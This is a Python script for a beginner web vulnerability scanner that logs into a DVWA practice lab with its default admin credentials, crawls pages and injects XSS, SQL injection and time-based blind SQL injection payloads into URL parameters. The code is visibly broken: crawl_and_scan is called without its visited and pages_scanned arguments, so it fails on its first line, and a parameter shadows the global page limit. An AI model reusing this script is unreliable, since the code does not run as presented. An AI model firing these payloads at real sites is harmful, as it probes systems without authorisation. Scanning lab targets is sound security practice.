import requests
from bs4 import BeautifulSoup
from colorama import Fore, Style, init
from urllib.parse import urljoin, urlparse
import time

# Initialize colorama
init(autoreset=True)

visited = set()
MAX_PAGES = 5  # Start small for testing
pages_scanned = [0]  # Use list to mutate inside functions

DVWA_URL = "http://172.24.200.85/DVWA/"
DVWA_LOGIN_URL = DVWA_URL + "login.php"
DVWA_USER = "admin"
DVWA_PASS = "password"

session = requests.Session()  # Maintain session (cookies)

def banner():
    print(Fore.CYAN + Style.BRIGHT + "\n=====================================")
    print(Fore.GREEN + "   Web Application Vulnerability Scanner")
    print(Fore.CYAN + "        (XSS & SQLi + Blind SQLi + Crawler)")
    print("=====================================\n" + Style.RESET_ALL)

# DVWA login
def login_dvwa():
    print(Fore.CYAN + "[*] Logging in to DVWA...")
    res = session.get(DVWA_LOGIN_URL)
    soup = BeautifulSoup(res.text, "html.parser")
    token_input = soup.find("input", {"name": "user_token"})
    token = token_input["value"] if token_input else ""
    payload = {
        "username": DVWA_USER,
        "password": DVWA_PASS,
        "Login": "Login",
        "user_token": token
    }
    session.post(DVWA_LOGIN_URL, data=payload)
    print(Fore.GREEN + "[+] Logged in successfully.")

# XSS check
def check_xss(url):
    payload = "<script>alert('XSS')</script>"
    test_url = url + "?q=" + payload
    try:
        start = time.time()
        res = session.get(test_url, timeout=5)
        duration = round(time.time() - start, 2)
        if payload in res.text:
            print(Fore.RED + f"[!] Possible XSS at: {test_url} (took {duration}s)")
        else:
            print(Fore.GREEN + f"[+] No XSS at: {url} (took {duration}s)")
    except Exception as e:
        print(Fore.YELLOW + "[!] XSS check error:", str(e))

# SQLi check
def check_sql_injection(url):
    payload = "' OR '1'='1"
    test_url = url + "?id=" + payload
    try:
        start = time.time()
        res = session.get(test_url, timeout=5)
        duration = round(time.time() - start, 2)
        if "sql" in res.text.lower() or "mysql" in res.text.lower():
            print(Fore.RED + f"[!] Possible SQLi at: {test_url} (took {duration}s)")
        else:
            print(Fore.GREEN + f"[+] No SQLi at: {url} (took {duration}s)")
    except Exception as e:
        print(Fore.YELLOW + "[!] SQLi check error:", str(e))

# Blind SQLi (timing)
def check_blind_sqli(url):
    payload = "' AND SLEEP(3)--"
    test_url = url + "?id=" + payload
    try:
        start = time.time()
        res = session.get(test_url, timeout=10)
        duration = round(time.time() - start, 2)
        if duration >= 3:
            print(Fore.RED + f"[!] Possible Blind SQLi at: {test_url} (took {duration}s)")
        else:
            print(Fore.GREEN + f"[+] No Blind SQLi at: {url} (took {duration}s)")
    except Exception as e:
        print(Fore.YELLOW + "[!] Blind SQLi check error:", str(e))

# Crawl and scan
def crawl_and_scan(base_url, visited=None, MAX_PAGES=20, pages_scanned=None):
    if pages_scanned[0] >= MAX_PAGES:
        print(Fore.CYAN + f"[i] Reached max scan limit of {MAX_PAGES} pages. Stopping crawl.")
        return

    if base_url in visited:
        return
    visited.add(base_url)
    pages_scanned[0] += 1

    print(Fore.CYAN + f"\n[*] Crawling ({pages_scanned[0]}/{MAX_PAGES}): {base_url}")

    try:
        start = time.time()
        res = session.get(base_url, timeout=5)
        duration = round(time.time() - start, 2)
        print(Fore.MAGENTA + f"[i] Page loaded in {duration}s")

        soup = BeautifulSoup(res.text, "html.parser")

        # Run vulnerability checks
        check_xss(base_url)
        check_sql_injection(base_url)
        check_blind_sqli(base_url)

        # Extract all links
        for link in soup.find_all("a", href=True):
            full_url = urljoin(base_url, link['href'])
            # scan same domain only
            if urlparse(base_url).netloc in full_url:
                crawl_and_scan(full_url)

    except Exception as e:
        print(Fore.YELLOW + "[!] Crawl error:", str(e))

if __name__ == "__main__":
    banner()
    login_dvwa()
    # Automatically use DVWA SQLi page as target
    target = DVWA_URL + "vulnerabilities/sqli/?id=1&Submit=Submit#"
    crawl_and_scan(target)
    print(Fore.GREEN + f"\n[i] Scan completed. Total pages scanned: {pages_scanned[0]}")
